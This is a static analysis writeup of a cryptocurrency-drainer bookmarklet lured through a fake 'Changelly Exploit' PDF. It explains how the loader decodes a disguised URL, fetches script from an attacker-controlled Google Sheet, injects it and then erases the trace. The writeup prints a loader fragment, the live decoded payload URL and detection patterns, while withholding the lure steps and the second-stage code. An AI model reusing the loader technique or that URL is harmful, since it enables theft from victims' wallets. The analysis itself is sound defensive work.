# "Changelly Exploit" — analysis of a first-stage drainer loader

Analysis date: 2026-10-18. **Static analysis only. Nothing was executed and
nothing was fetched.**

Preservation bag: `node tools/build_changelly_drainer_xena.mjs` writes a
BagIt bag to `dist/changelly-drainer-xena/` (gitignored). Tests:
`tests/changelly-drainer-xena.test.mjs`.

## Source object

A PDF titled `Changelly Exploit.pdf` on Google Drive
(`1UrK4jHA9kNLogV0He2Uq0rgk2Q5bVy_d`, 490,147 bytes, text-extractable). It
claims that an internal developer loader is still reachable on changelly.com,
that it will load a deprecated "node v3.27" behind the password `admin`, and
that swaps of BTC, LTC, ETH, XMR or SOL above $200 then pay out roughly 50%
above the live rate. It walks the reader through pasting a `javascript:`
payload into the address bar.

Its instructions are not reproduced here or in the bag. Redistributing the lure
helps the attacker, not the record.

## The loader

```
(async()=>{const URL="https://docs.changelly.com/development/authentication?=<base64>",
 r=await fetch(atob(URL.split("authentication?=")[1])), ...
```

Step by step:

1. Split the URL string on `authentication?=` and keep everything after it.
2. `atob` that suffix. **This is the real fetch target.**
3. `fetch` it — the `gviz` query endpoint of a published Google Sheet.
4. Match `googlevisualizationQuerysetResponse`, `JSON.parse` the payload.
5. Index the rows by column A, taking column B as the value.
6. Concatenate the `node` and `path` values into one string.
7. Create a `<script>` element, set `textContent` to that string, append it.
8. Appending executes it. `el.remove()` then erases the DOM trace.

Decoded fetch target (164 bytes, SHA-256
`39bf3818350c01835bd34b3bca57f5f54500c19ee9c3193368069e1b9f38afe9`):

```
https://docs.google.com/spreadsheets/d/15ZXXqVaJrRoojcBDbApNfHP_n6z5sLlFLNhdLNJd5PM/gviz/tq?sheet=API&headers=1&tq=select%20A%2CB%20where%20A='node'%20or%20A='path'
```

The base64 blob itself is pinned at SHA-256
`cf9da67cf95d9a4cfc31c3f71e0b51ffc81b9ac97738ad18f2f8301438762da2`. Both were
decoded independently in Python and Node and agree byte for byte; the builder
fails closed if either pin drifts.

## Why this is a drainer and not an arbitrage bug

**The Changelly domain is camouflage.** `fetch` receives the base64-decoded
suffix, so `docs.changelly.com/development/authentication` is never requested.
It exists so that a victim glancing at the string sees a plausible vendor
domain. The bytes go to `docs.google.com`.

**The payload is remote and swappable.** The attacker controls the spreadsheet.
Rewriting the `node` and `path` cells changes what every holder of the
bookmarklet executes, with no change to the document being circulated. This is
why the bag records a *location* and not a payload — and why that location
should be treated as hostile and live.

**Splitting the payload across two cells is deliberate.** `node` + `path`
concatenated means no single cell holds a complete, greppable script, which
defeats naive content scanning of the sheet.

**Execute, then clean up.** Appending a `<script>` with `textContent` set runs
it synchronously; `el.remove()` afterwards removes the visible evidence.
Legitimate developer tooling does neither.

**The delivery is textbook self-XSS.** Browsers refuse to run pasted
`javascript:` URLs precisely to prevent this. The document's insistence that
the prefix be typed by hand, that the globe suggestion be picked rather than
Search, and that Firefox's `allow pasting` guard be overridden is a set of
instructions for dismantling those specific protections.

**The economics are bait.** An unpatched, publicly reachable ~50% arbitrage on
a major exchange closes in minutes, not months. The $200 floor and the five
named sending assets exist to get real funds committed before the payload runs.

**The mechanism is not credible.** A dev loader gated on the password `admin`
and reachable from a production frontend, loading a deprecated rate node that
then answers live swaps, is not how exchange pricing works. "Locked in when the
transaction is created" exists to make a fabricated payout feel committed.

## Detection

- `fetch()` of `docs.google.com/spreadsheets/*/gviz/tq` from an exchange origin
- base64 decode of a substring split off a URL containing `authentication?=`
- `document.createElement('script')` with `textContent` assigned from network data
- a script element appended and then immediately removed
- a `javascript:` URL executed from the address bar
- `allow pasting` typed into a browser console

## If you ran it

Treat any wallet or exchange session in that browser as compromised. Move funds
from a clean device, rotate API keys, revoke sessions, and do not reuse that
browser profile.

## Scope limits, stated plainly

- **The spreadsheet was not fetched.** Retrieving an attacker's live payload
  serves no defensive purpose that static analysis does not already provide,
  and `docs.google.com` is not in this sandbox's outbound allowlist regardless.
- **The second-stage payload is not in the bag** and never was.
- **Ghidra does not apply.** It analyses native binaries; this is JavaScript.
  The repository's Ghidra-WASM path (`tools/decompile_mz.mjs`) parses MZ images
  and has nothing to say about a bookmarklet. Ghidra proper also cannot run in
  this sandbox — no `ghidra`/`analyzeHeadless` on PATH, the vendored
  `wasm/ghidra/` decompiler ships only Atmel and x86 processor specs, and
  JDK 21 (required by Ghidra 12.x) fails to start here with
  `Failed setting boot class path`.
- **The loader is stored as `.txt`.** No file in the bag carries an extension a
  browser or shell would execute, and a test asserts that.

## Relation to the earlier position

This is the same line held on the PDF when it first appeared: investigate and
document, do not operationalise. What changed is that the payload was
recovered, so the analysis can now be specific about mechanism rather than
inferring intent from the delivery method.
